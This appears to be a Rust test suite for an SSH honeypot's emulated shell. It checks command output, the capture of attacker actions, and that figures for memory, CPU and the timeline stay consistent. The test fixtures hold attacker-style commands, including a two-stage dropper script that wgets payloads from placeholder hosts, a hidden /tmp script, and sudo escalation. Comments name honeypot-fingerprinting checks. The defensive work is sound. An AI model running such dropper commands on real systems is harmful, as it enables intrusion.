use crate::clock;
use crate::shell::{Screen, Shell};

fn run(shell: &mut Shell, line: &str) -> String {
    shell.execute(line).text
}

/// The whole point of running a dropped script: the download was already
/// captured, but nothing downstream of it was observable until the body
/// actually ran.
#[test]
fn a_dropped_script_runs_its_body() {
    let mut shell = Shell::new("root", "debian");
    run(&mut shell, "mkdir -p /tmp/.x");
    shell.execute("printf '#!/bin/sh\\nid\\nwhoami\\n' > /tmp/.x/p.sh");
    let out = shell.execute("sh /tmp/.x/p.sh");
    assert!(out.stdout.contains("uid=0(root)"), "{:?}", out.stdout);
    assert!(out.stdout.contains("root\n"), "{:?}", out.stdout);
    // A missing script fails the way a real shell reports it.
    let missing = shell.execute("sh /tmp/nope.sh");
    assert_eq!(missing.status, 127);
}

/// A `command` event is emitted per line the *client* submits, so without a
/// capture per script line the log would show `sh /tmp/p.sh` and nothing of
/// what it did — which is exactly the intelligence running the body exists
/// to recover.
#[test]
fn a_dropped_script_reports_each_line_it_ran() {
    use crate::shell::Capture;
    let mut shell = Shell::new("root", "debian");
    shell.execute("printf '#!/bin/sh\\nid\\nnosuchcmd\\n' > /tmp/p.sh");
    shell.captures.clear();
    shell.execute("sh /tmp/p.sh");

    let lines: Vec<(String, i32)> = shell
        .captures
        .iter()
        .filter_map(|c| match c {
            Capture::ScriptCommand { line, status } => Some((line.clone(), *status)),
            _ => None,
        })
        .collect();
    assert_eq!(
        lines,
        vec![("id".to_string(), 0), ("nosuchcmd".to_string(), 127)],
        "the shebang is not a command; the 127 is the field that names what \
         to emulate next"
    );
}

/// `Shell::execute` clears captures on entry, so a script's lines would
/// overwrite each other's side effects — the second fetch of a two-stage
/// dropper is exactly the one an analyst needs.
#[test]
fn a_script_keeps_every_line_s_captures() {
    use crate::shell::Capture;
    let mut shell = Shell::new("root", "debian");
    shell
        .execute("printf 'wget http://a.example/one\\nwget http://b.example/two\\n' > /tmp/two.sh");
    shell.captures.clear();
    shell.execute("sh /tmp/two.sh");

    let urls: Vec<String> = shell
        .captures
        .iter()
        .filter_map(|c| match c {
            Capture::Download { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(
        urls,
        vec![
            "http://a.example/one".to_string(),
            "http://b.example/two".to_string()
        ],
        "a line's captures were overwritten by the next line's"
    );
}

/// A script that runs itself is the obvious way to turn one upload into an
/// unbounded stack. `dispatch`'s nesting cap has to catch it, because a
/// stack overflow aborts the whole process rather than one session.
#[test]
fn a_self_running_script_hits_the_nesting_cap() {
    let mut shell = Shell::new("root", "debian");
    shell.execute("echo 'sh /tmp/loop.sh' > /tmp/loop.sh");
    let out = shell.execute("sh /tmp/loop.sh");
    assert!(
        out.stderr.contains("Resource temporarily unavailable"),
        "recursion was not bounded: {:?}",
        out.stderr
    );
}

/// A script's line count is not bounded by the output cap: a million `true`
/// lines produce nothing to truncate and still cost a parse each.
#[test]
fn a_script_runs_at_most_the_line_cap() {
    let mut shell = Shell::new("root", "debian");
    let body = "echo x\n".repeat(super::interpreter::MAX_SCRIPT_LINES + 500);
    let out = shell.execute(&format!("printf '%s' '{body}' | sh"));
    assert_eq!(
        out.stdout.matches('x').count(),
        super::interpreter::MAX_SCRIPT_LINES,
        "line cap not applied"
    );
}

#[test]
fn sudo_dash_i_and_dash_s_hand_over_a_root_shell() {
    // `-i` is a login shell: root's identity, environment, and home.
    let mut shell = Shell::new("attacker", "debian");
    assert_eq!(run(&mut shell, "sudo -i"), "");
    assert_eq!(shell.last_status, 0);
    assert_eq!(run(&mut shell, "whoami"), "root\n");
    assert_eq!(run(&mut shell, "pwd"), "/root\n");
    assert_eq!(shell.prompt(), "root@debian:~# ");
    assert_eq!(run(&mut shell, "echo $HOME"), "/root\n");

    // `-s` changes the identity but not where the caller stood: Debian's
    // sudoers does not set `always_set_home`, so `$HOME` stays theirs too.
    let mut shell = Shell::new("attacker", "debian");
    run(&mut shell, "cd /tmp");
    assert_eq!(run(&mut shell, "sudo -s"), "");
    assert_eq!(run(&mut shell, "whoami"), "root\n");
    assert_eq!(run(&mut shell, "pwd"), "/tmp\n");
    assert_eq!(shell.prompt(), "root@debian:/tmp# ");
    assert_eq!(run(&mut shell, "echo $HOME"), "/home/attacker\n");

    // A flag with a command still runs just that command as root, without
    // handing over the session.
    let mut shell = Shell::new("attacker", "debian");
    assert_eq!(
        run(&mut shell, "sudo -i id"),
        "uid=0(root) gid=0(root) groups=0(root)\n"
    );
    assert_eq!(run(&mut shell, "whoami"), "attacker\n");

    // Everything else with no command is still the usage block.
    let mut shell = Shell::new("attacker", "debian");
    assert!(run(&mut shell, "sudo").contains("usage: sudo"));
    assert_eq!(run(&mut shell, "whoami"), "attacker\n");
}

#[test]
fn sh_runs_a_command_line_and_bare_shells_are_silent() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "sh -c whoami"), "root\n");
    assert_eq!(run(&mut shell, "bash -c 'echo hi'"), "hi\n");
    // A bare `bash`/`sh` is a subshell: nothing is printed and the next
    // prompt is identical, so the attacker sees what a real one would.
    assert_eq!(run(&mut shell, "bash"), "");
    assert_eq!(shell.last_status, 0);
}

#[test]
fn nested_commands_are_bounded() {
    let mut shell = Shell::new("root", "debian");
    let deep = format!("{}whoami", "sudo ".repeat(40));
    let out = run(&mut shell, &deep);
    assert!(
        out.contains("Resource temporarily unavailable"),
        "expected the nesting cap to refuse, got {out:?}"
    );
    // The counter unwinds: the next command runs normally.
    assert_eq!(run(&mut shell, "whoami"), "root\n");
}

#[test]
fn scp_needs_a_real_network_and_says_so() {
    let mut shell = Shell::new("root", "debian");
    assert!(run(&mut shell, "scp").contains("usage: scp"));
    let out = run(&mut shell, "scp /tmp/x root@10.0.0.9:/tmp/");
    assert!(
        out.contains("connect to host 10.0.0.9 port 22: Connection refused"),
        "{out:?}"
    );
    assert_eq!(shell.last_status, 1);
}

#[test]
fn whoami_and_hostname_reflect_identity() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "whoami"), "root\n");
    assert_eq!(run(&mut shell, "hostname"), "debian\n");
}

#[test]
fn id_distinguishes_root_from_user() {
    let mut root = Shell::new("root", "debian");
    assert_eq!(
        run(&mut root, "id"),
        "uid=0(root) gid=0(root) groups=0(root)\n"
    );
    let mut user = Shell::new("attacker", "debian");
    assert_eq!(
        run(&mut user, "id"),
        "uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)\n"
    );
}

#[test]
fn uname_defaults_and_flags() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "uname"), "Linux\n");
    assert_eq!(run(&mut shell, "uname -r"), "6.1.0-21-amd64\n");
    assert_eq!(
        run(&mut shell, "uname -a"),
        "Linux debian 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux\n"
    );
    // Combined short flags.
    assert_eq!(run(&mut shell, "uname -sm"), "Linux x86_64\n");
}

#[test]
fn echo_newline_and_escapes() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "echo hello world"), "hello world\n");
    assert_eq!(run(&mut shell, "echo -n hi"), "hi");
    // Single quotes preserve the backslash so `echo -e` can interpret it.
    assert_eq!(run(&mut shell, r"echo -e 'a\tb'"), "a\tb\n");
    // Without -e, the escape stays literal.
    assert_eq!(run(&mut shell, r"echo 'a\tb'"), "a\\tb\n");
    // Double quotes leave a backslash alone unless it escapes one of the
    // four characters that are special inside them, so `echo -e` gets the
    // same string it would in bash.
    assert_eq!(run(&mut shell, "echo -e \"a\\tb\\nc\""), "a\tb\nc\n");
    assert_eq!(run(&mut shell, "echo \"a\\tb\""), "a\\tb\n");
    assert_eq!(run(&mut shell, "echo \"a\\\"b\\\\c\""), "a\"b\\c\n");
    // The rest of the GNU escape table.
    assert_eq!(run(&mut shell, r"echo -e 'x\e[0m'"), "x\x1b[0m\n");
    assert_eq!(run(&mut shell, r"echo -e '\0101\x42\x2'"), "AB\x02\n");
    assert_eq!(run(&mut shell, r"echo -e 'no newline\c'"), "no newline");
    assert_eq!(run(&mut shell, r"echo -e 'keep\q\xzz'"), "keep\\q\\xzz\n");
}

#[test]
fn export_unset_and_env_roundtrip() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "export FOO=bar"), "");
    assert_eq!(run(&mut shell, "echo $FOO"), "bar\n");
    assert!(run(&mut shell, "env").contains("FOO=bar\n"));
    assert_eq!(run(&mut shell, "unset FOO"), "");
    assert_eq!(run(&mut shell, "echo $FOO"), "\n");
}

#[test]
fn clear_emits_ansi_reset() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "clear"), "\x1b[H\x1b[2J\x1b[3J");
}

#[test]
fn ps_aux_lists_system_and_session() {
    let mut shell = Shell::new("root", "debian");
    let out = run(&mut shell, "ps aux");
    assert!(out.contains("USER"));
    assert!(out.contains("/sbin/init"));
    assert!(out.contains("sshd"));
    assert!(out.contains("-bash"));
}

#[test]
fn ps_ef_format() {
    let mut shell = Shell::new("root", "debian");
    let out = run(&mut shell, "ps -ef");
    assert!(out.contains("UID"));
    assert!(out.contains("PPID"));
}

#[test]
fn kill_unknown_pid_errors() {
    let mut shell = Shell::new("root", "debian");
    let out = shell.execute("kill 999999");
    assert!(out.text.contains("No such process"));
    assert_eq!(shell.last_status, 1);
}

#[test]
fn kill_system_pid_denied_for_nonroot() {
    let mut shell = Shell::new("attacker", "debian");
    let out = shell.execute("kill 1");
    assert!(out.text.contains("Operation not permitted"));
    assert_eq!(shell.last_status, 1);
}

#[test]
fn top_takes_the_screen_only_where_a_real_one_would() {
    let mut shell = Shell::new("root", "debian");

    // On a terminal it takes the screen and prints nothing itself: the
    // display paints from the network layer's redraw timer.
    let out = run(&mut shell, "top");
    assert_eq!(out, "");
    let screen = shell.screen.take().expect("top should hold the screen");
    let Screen::Top(top) = screen else {
        panic!("top should hold a Screen::Top");
    };
    assert!(top.render().contains("Tasks:"));

    // Batch mode and an iteration count are the one-shot dump.
    for line in ["top -b", "top -bn1", "top -n 1", "top --batch"] {
        assert!(
            run(&mut shell, line).contains("Tasks:"),
            "{line} should print a dump"
        );
        assert!(shell.screen.is_none(), "{line} should not hold the screen");
    }

    // A pipe is not a terminal, and neither is a redirect.
    assert!(
        run(&mut shell, "top | wc -l")
            .trim()
            .parse::<u32>()
            .unwrap()
            > 5
    );
    assert!(shell.screen.is_none(), "a pipe should not hold the screen");
    run(&mut shell, "top > /tmp/t");
    assert!(
        shell.screen.is_none(),
        "a redirect should not hold the screen"
    );

    // Neither is a one-shot `exec`, whatever its stdout is.
    shell.interactive = false;
    assert!(run(&mut shell, "top").contains("Tasks:"));
    assert!(shell.screen.is_none(), "exec should not hold the screen");
    shell.interactive = true;

    // A substitution runs in a subshell with no terminal of its own, so it
    // captures a dump and hands the session back unheld.
    let sub = run(&mut shell, "echo $(top)");
    assert!(sub.contains("Tasks:"));
    assert!(
        shell.screen.is_none(),
        "a substitution should not hold the screen"
    );
}

#[test]
fn top_and_free_render() {
    let mut shell = Shell::new("root", "debian");
    assert!(run(&mut shell, "top -b").contains("Tasks:"));
    assert!(run(&mut shell, "free").contains("Mem:"));
    // procps' scaling: a decimal place only below 10, so `1.9Gi` but
    // `346Mi` — never `346.0Mi`. Asserted as the rule rather than against
    // pinned figures, because the numbers now come from the deployment
    // persona and differ per sensor by design.
    let human = run(&mut shell, "free -h");
    assert!(!human.contains(".0Mi"), "unexpected `free -h`: {human}");
    assert!(!human.contains(".0Gi"), "unexpected `free -h`: {human}");
    assert!(human.contains("Gi") || human.contains("Mi"), "{human}");
}

/// Whatever RAM a deployment claims, every command that reports it must
/// report the same figure. `free` disagreeing with `/proc/meminfo` is a
/// two-command honeypot check, and the persona exists to make the two
/// impossible to set independently.
#[test]
fn memory_figures_agree_across_commands_for_every_persona() {
    for seed in 0..16u64 {
        let persona = crate::persona::Persona::from_seed(seed);
        let total = persona.mem_total_kb;
        let mut shell = Shell::with_persona("root", "debian", persona);

        let meminfo = run(&mut shell, "cat /proc/meminfo");
        assert!(
            meminfo.contains(&format!("MemTotal:        {total} kB")),
            "seed={seed} meminfo={meminfo}"
        );

        // `free` prints kB totals in its first column.
        let free_out = run(&mut shell, "free");
        let mem_line = free_out
            .lines()
            .find(|l| l.starts_with("Mem:"))
            .expect("a Mem: row");
        let reported: u64 = mem_line
            .split_whitespace()
            .nth(1)
            .and_then(|v| v.parse().ok())
            .expect("a total column");
        assert_eq!(reported, total, "seed={seed}: free disagrees with meminfo");
    }
}

/// The same, for the CPU: `nproc`, `lscpu` and `/proc/cpuinfo` all read the
/// persona, so none of them can name a processor the others do not.
#[test]
fn cpu_figures_agree_across_commands_for_every_persona() {
    for seed in 0..16u64 {
        let persona = crate::persona::Persona::from_seed(seed);
        let (cores, name) = (persona.cpu_cores, persona.cpu.name);
        let mut shell = Shell::with_persona("root", "debian", persona);

        assert_eq!(run(&mut shell, "nproc").trim(), cores.to_string());

        let lscpu_out = run(&mut shell, "lscpu");
        assert!(lscpu_out.contains(name), "seed={seed}: {lscpu_out}");
        assert!(
            lscpu_out.contains(&format!("CPU(s):                   {cores}")),
            "seed={seed}: {lscpu_out}"
        );

        let cpuinfo = run(&mut shell, "cat /proc/cpuinfo");
        assert!(cpuinfo.contains(name), "seed={seed}");
        assert_eq!(
            cpuinfo.matches("processor\t: ").count(),
            cores as usize,
            "seed={seed}: one cpuinfo block per core"
        );
    }
}

#[test]
fn uptime_renders() {
    let mut shell = Shell::new("root", "debian");
    assert!(run(&mut shell, "uptime").contains("load average:"));
}

#[test]
fn history_numbers_then_clears() {
    let mut shell = Shell::new("root", "debian");
    shell.record_history("ls");
    shell.record_history("pwd");
    let out = run(&mut shell, "history");
    assert!(out.contains("    1  ls"));
    assert!(out.contains("    2  pwd"));
    run(&mut shell, "history -c");
    assert!(shell.history.is_empty());
}

#[test]
fn which_external_builtin_and_sbin() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "which wget"), "/usr/bin/wget\n");
    assert_eq!(run(&mut shell, "which ip"), "/usr/sbin/ip\n");
    // Builtins are not external binaries: no output, status 1.
    assert_eq!(run(&mut shell, "which cd"), "");
    assert_eq!(shell.last_status, 1);
}

#[test]
fn w_and_last_show_current_user_only() {
    let mut shell = Shell::new("attacker", "debian");
    let w = run(&mut shell, "w");
    assert!(w.contains("load average:"));
    assert!(w.contains("attacker"));
    let last = run(&mut shell, "last");
    assert!(last.contains("attacker"));
    assert!(last.contains("wtmp begins"));
}

#[test]
fn df_human_flag_changes_units() {
    let mut shell = Shell::new("root", "debian");
    assert!(run(&mut shell, "df").contains("1K-blocks"));
    assert!(run(&mut shell, "df -h").contains("Size"));
}

#[test]
fn mount_lists_fabricated_table() {
    let mut shell = Shell::new("root", "debian");
    assert!(run(&mut shell, "mount").contains("/dev/sda1 on / type ext4"));
}

#[test]
fn crontab_l_reports_none() {
    let mut shell = Shell::new("attacker", "debian");
    assert_eq!(run(&mut shell, "crontab -l"), "no crontab for attacker\n");
    assert_eq!(shell.last_status, 1);
}

#[test]
fn nproc_and_lscpu_match_cpuinfo() {
    let mut shell = Shell::new("root", "debian");
    assert_eq!(run(&mut shell, "nproc"), "1\n");
    assert!(run(&mut shell, "lscpu").contains("Xeon(R) Platinum 8259CL"));
}

#[test]
fn sudo_elevates_for_one_command_then_restores() {
    let mut shell = Shell::new("attacker", "debian");
    assert_eq!(shell.uid, 1000);
    // A privileged apt subcommand is denied without sudo...
    assert!(run(&mut shell, "apt update").contains("Permission denied"));
    // ...but succeeds prefixed with sudo, and uid is restored afterward.
    assert!(run(&mut shell, "sudo apt update").contains("Reading package lists"));
    assert_eq!(shell.uid, 1000);
}

#[test]
fn sudo_list_and_bare_usage() {
    let mut shell = Shell::new("attacker", "debian");
    assert!(run(&mut shell, "sudo -l").contains("(ALL : ALL) ALL"));
    assert!(run(&mut shell, "sudo").contains("usage: sudo"));
}

#[test]
fn su_switches_identity_and_home() {
    let mut shell = Shell::new("attacker", "debian");
    // A non-root user is prompted for a password before the switch; the
    // shell defers, exposing a pending prompt the network layer drives.
    assert_eq!(run(&mut shell, "su"), "Password: ");
    assert!(shell.pending.is_some());
    assert_eq!(shell.uid, 1000, "identity is unchanged until a password");
    // Answering the prompt performs the switch and captures the attempt.
    assert_eq!(shell.resume("hunter2").text, "");
    assert!(shell.pending.is_none());
    assert_eq!(shell.username, "root");
    assert_eq!(shell.uid, 0);
    assert_eq!(shell.cwd_path(), "/root");
    assert!(
        matches!(
            shell.captures.first(),
            Some(crate::shell::Capture::SuAuth { target, password })
                if target == "root" && password == "hunter2"
        ),
        "the attempted password is captured as forensic data"
    );
    // Root switches to any account without a password prompt.
    assert_eq!(run(&mut shell, "su someoneelse"), "");
    assert!(shell.pending.is_none());
    assert_eq!(shell.uid, 1000);
    assert_eq!(shell.cwd_path(), "/home/someoneelse");
}

#[test]
fn pkill_matches_by_name_and_respects_ownership() {
    let mut root = Shell::new("root", "debian");
    assert_eq!(run(&mut root, "pkill bash"), "");
    let mut user = Shell::new("attacker", "debian");
    // The fake table's system processes are owned by root; a non-root
    // session may not "kill" them.
    assert!(run(&mut user, "pkill sshd").contains("Operation not permitted"));
    assert!(run(&mut user, "pkill no-such-process").is_empty());
}

#[test]
fn groups_arch_and_tty_reflect_identity() {
    let mut root = Shell::new("root", "debian");
    assert_eq!(run(&mut root, "groups"), "root\n");
    assert_eq!(run(&mut root, "arch"), "x86_64\n");
    assert_eq!(run(&mut root, "tty"), "/dev/pts/0\n");
    let mut user = Shell::new("attacker", "debian");
    assert_eq!(run(&mut user, "groups"), "attacker sudo\n");
}

#[test]
fn lsb_release_all_and_short_forms() {
    let mut shell = Shell::new("root", "debian");
    let all = run(&mut shell, "lsb_release -a");
    assert!(all.contains("Distributor ID:\tDebian"));
    assert!(all.contains("Description:\tDebian GNU/Linux 12 (bookworm)"));
    assert!(all.contains("Codename:\tbookworm"));
    // Short selectors print just the value.
    assert_eq!(run(&mut shell, "lsb_release -cs"), "bookworm\n");
    assert_eq!(run(&mut shell, "lsb_release -rs"), "12\n");
}

#[test]
fn dmesg_is_root_only() {
    let mut root = Shell::new("root", "debian");
    assert!(run(&mut root, "dmesg").contains("Hypervisor detected: KVM"));
    let mut user = Shell::new("attacker", "debian");
    assert!(run(&mut user, "dmesg").contains("Operation not permitted"));
    assert_eq!(user.last_status, 1);
}

#[test]
fn date_default_and_format_specifiers() {
    let mut shell = Shell::new("root", "debian");
    // Default form: `Wdy Mon DD HH:MM:SS UTC YYYY`.
    let default = run(&mut shell, "date");
    assert!(default.contains("UTC"));
    assert!(default.ends_with('\n'));
    // %F/%T/%s formats are self-consistent with gmtime.
    let f = run(&mut shell, "date +%F");
    assert_eq!(f.matches('-').count(), 2);
    assert_eq!(run(&mut shell, "date +%%"), "%\n");
}

/// `date`, `uptime`, `w`, `last` and `ps` all describe the same box. An
/// attacker comparing any two of them must not find a contradiction — a
/// login dated before the boot, or a daemon older than the uptime.
#[test]
fn the_recon_commands_agree_on_one_timeline() {
    let mut shell = Shell::new("root", "debian");
    let year = clock::format(clock::now(), "%Y");

    // `date` and the `uptime`/`w`/`top` banners share a clock.
    assert!(run(&mut shell, "date").contains(&year));
    let banner = clock::uptime_banner();
    assert!(run(&mut shell, "uptime").contains(&banner));
    assert!(run(&mut shell, "w").contains(&banner));
    assert!(run(&mut shell, "top -b").contains(&banner));

    // `last` reports this year's boot, not a date frozen at compile time.
    let last = run(&mut shell, "last");
    assert!(last.contains(&year), "last should be in {year}: {last}");
    assert!(last.contains("still logged in"));
    assert!(last.contains("wtmp begins"));
    // The previous login `last` lists is the one PAM's banner announces.
    let (prev, _) = clock::prev_login();
    assert!(last.contains(&clock::format(prev, "%a %b %e %H:%M")));

    // Daemons started at boot; nothing claims to predate the box.
    let ps = run(&mut shell, "ps aux");
    assert!(ps.contains(&clock::format(clock::boot_time(), "%b%d")));
    // Snapshot files carry the install date, which is older still.
    let ls = run(&mut shell, "ls -l /etc/passwd");
    assert!(ls.contains(&clock::format(clock::install_time(), "%b %e")));
}

/// Real `top` is in its own process list; showing `ps aux` as the running
/// process says the output came from somewhere else.
#[test]
fn top_and_ps_list_themselves_not_each_other() {
    let mut shell = Shell::new("root", "debian");
    let top = run(&mut shell, "top -b");
    assert!(top.contains(" top\n"), "top should list itself: {top}");
    assert!(!top.contains("ps aux"));
    assert!(run(&mut shell, "ps aux").contains("ps aux"));
}

/// `free`'s columns must add up the way procps derives them, and agree
/// with both `/proc/meminfo` and `top`'s header.
#[test]
fn the_memory_figures_agree_across_commands() {
    let mut shell = Shell::new("root", "debian");
    let free = run(&mut shell, "free");
    let row = free
        .lines()
        .find(|l| l.starts_with("Mem:"))
        .expect("free should print a Mem: row");
    let cols: Vec<u64> = row
        .split_whitespace()
        .skip(1)
        .filter_map(|f| f.parse().ok())
        .collect();
    let (total, used, free_mem, buff) = (cols[0], cols[1], cols[2], cols[4]);
    assert_eq!(total, used + free_mem + buff);

    // MemTotal is where every other figure comes from.
    let meminfo = run(&mut shell, "cat /proc/meminfo");
    assert!(meminfo.contains(&format!("MemTotal:        {total} kB")));
    // `df`'s tmpfs sizes are halves and tenths of it, so a `df` that
    // implies more RAM than `free` reports cannot happen.
    let df = run(&mut shell, "df");
    assert!(df.contains(&format!("{}", total / 2)), "/dev/shm is RAM/2");
    assert!(df.contains(&format!("{}", total / 10)), "/run is RAM/10");
    // `top`'s header is the same total in MiB.
    assert!(run(&mut shell, "top -b").contains(&format!("{:.1} total", total as f64 / 1024.0)));
}
